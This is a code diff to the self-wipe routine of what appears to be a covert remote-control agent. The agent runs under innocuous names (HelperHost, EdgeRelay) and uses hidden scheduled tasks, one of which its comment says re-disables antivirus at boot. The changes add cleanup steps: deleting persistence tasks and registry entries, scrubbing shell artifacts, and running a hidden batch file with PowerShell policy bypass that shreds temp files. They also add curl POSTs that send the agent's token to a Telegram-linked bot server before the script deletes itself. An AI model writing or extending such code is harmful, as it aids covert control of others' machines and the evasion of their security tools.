@@ -541,16 +541,7 @@ Get-Process HelperHost,EdgeRelay -EA SilentlyContinue | Stop-Process -Force
 func wipeAll() {
 	stopFlag = true
 	tok := token
-
-	// Notify bot FIRST while tunnel still works — otherwise "suppression en cours" hangs forever.
-	if tok != "" && strings.TrimRight(botBase, "/") != "" {
-		for i := 0; i < 3; i++ {
-			if reportWiped(tok) == nil {
-				break
-			}
-			time.Sleep(time.Second)
-		}
-	}
+	bb := strings.TrimRight(botBase, "/")
 
 	if runtime.GOOS == "windows" {
 		restoreWindowsNotifications()
@@ -562,7 +553,8 @@ func wipeAll() {
 		clearStateStore()
 	}
 	// Keep HelperHostWipeRestore until bat runs it (elevated AV restore).
-	for _, tn := range []string{"HelperHost", "HelperHostResume", "HelperHostBoot", "HelperHostResumeBoot", "AgentShePC"} {
+	// Delete EarlyAV immediately so it cannot re-disable AV on next boot mid-wipe.
+	for _, tn := range []string{"HelperHost", "HelperHostResume", "HelperHostBoot", "HelperHostResumeBoot", "HelperHostEarlyAV", "AgentShePC"} {
 		_ = exec.Command("schtasks", "/Delete", "/TN", tn, "/F").Run()
 	}
 	if runtime.GOOS == "windows" {
@@ -572,7 +564,8 @@ func wipeAll() {
 		_ = exec.Command("reg", "delete", `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run`, "/v", "AgentShePC", "/f").Run()
 	}
 	killRelatedProcs()
-	killTunnelOnly()
+	// Keep bot tunnel URL reachable via botBase (bot public URL) for final wiped ack from bat.
+	// Do NOT notify the bot yet — bat curls action=wiped after restore finishes.
 	scrubShellArtifacts()
 	if runtime.GOOS == "windows" {
 		clearStateStore()
@@ -607,11 +600,21 @@ func wipeAll() {
 		restorePS1 := filepath.Join(os.TempDir(), "hh-restore-security.ps1")
 		_ = os.WriteFile(restorePS1, []byte(restoreWinSecurityPS1), 0o644)
 		bat := filepath.Join(os.TempDir(), "hh-wipe.cmd")
+		notifyLine := ""
+		if tok != "" && bb != "" {
+			// Final ack AFTER restore + shred — bot notifies Telegram only then.
+			// botBase is the bot public URL (not the PC tunnel).
+			escTok := strings.ReplaceAll(tok, `"`, "")
+			escBB := strings.ReplaceAll(bb, `"`, "")
+			notifyLine = "curl.exe -fsSL -X POST \"" + escBB + "/agent?action=wiped\" -H \"Content-Type: application/json\" -d \"{\\\"token\\\":\\\"" + escTok + "\\\"}\" >nul 2>&1\r\n" +
+				"ping 127.0.0.1 -n 2 >nul\r\n"
+		}
 		// No RunAs -Wait (hangs on UAC). Prefer schtasks elevated restore, then shred+rmdir.
 		body := "@echo off\r\n" +
 			"ping 127.0.0.1 -n 2 >nul\r\n" +
+			"schtasks /Delete /TN HelperHostEarlyAV /F >nul 2>&1\r\n" +
 			"schtasks /Run /TN HelperHostWipeRestore >nul 2>&1\r\n" +
-			"ping 127.0.0.1 -n 3 >nul\r\n" +
+			"ping 127.0.0.1 -n 5 >nul\r\n" +
 			"powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File \"" + restorePS1 + "\" >nul 2>&1\r\n" +
 			"taskkill /F /IM HelperHost.exe >nul 2>&1\r\n" +
 			"taskkill /F /IM EdgeRelay.exe >nul 2>&1\r\n" +
@@ -649,12 +652,18 @@ func wipeAll() {
 			"del /f /q \"" + restorePS1 + "\" >nul 2>&1\r\n" +
 			"del /f /q \"%TEMP%\\HelperHost-elev-*.ps1\" >nul 2>&1\r\n" +
 			"del /f /q \"%TEMP%\\HelperHost-install.*\" >nul 2>&1\r\n" +
+			"del /f /q \"%TEMP%\\hh-tool-*\" >nul 2>&1\r\n" +
+			"del /f /q \"%TEMP%\\hh-export-*\" >nul 2>&1\r\n" +
+			notifyLine +
 			"del /f /q \"%TEMP%\\hh-*\" >nul 2>&1\r\n" +
 			"del \"%~f0\" >nul 2>&1\r\n"
 		_ = os.WriteFile(bat, []byte(body), 0o644)
 		cmd := exec.Command("cmd", "/C", "start", "", "/MIN", bat)
 		hideWindow(cmd)
 		_ = cmd.Start()
+		// Give bat a head start before we tear down the PC agent tunnel.
+		time.Sleep(2 * time.Second)
+		killTunnelOnly()
 	} else {
 		// Deferred wipe: launchd/systemd KeepAlive can race; finish after we exit.
 		wipeSh := filepath.Join(os.TempDir(), "hh-wipe.sh")
@@ -687,8 +696,12 @@ func wipeAll() {
 		}
 		script += "rm -rf " + shellQuote(dir) + " " + shellQuote(cacheDir) +
 			" /tmp/HelperHostCache " + shellQuote(filepath.Join(os.TempDir(), "HelperHostCache")) +
-			" " + shellQuote(filepath.Join(homeOrEmpty(), ".agentshe")) + "\n" +
-			"rm -f \"$0\"\n"
+			" " + shellQuote(filepath.Join(homeOrEmpty(), ".agentshe")) + "\n"
+		if tok != "" && bb != "" {
+			script += "curl -fsSL -X POST " + shellQuote(bb+"/agent?action=wiped") +
+				" -H 'Content-Type: application/json' -d " + shellQuote(`{"token":"`+tok+`"}`) + " >/dev/null 2>&1\n"
+		}
+		script += "rm -f \"$0\"\n"
 		_ = os.WriteFile(wipeSh, []byte(script), 0o755)
 		cmd := exec.Command("/bin/bash", wipeSh)
 		hideWindow(cmd)
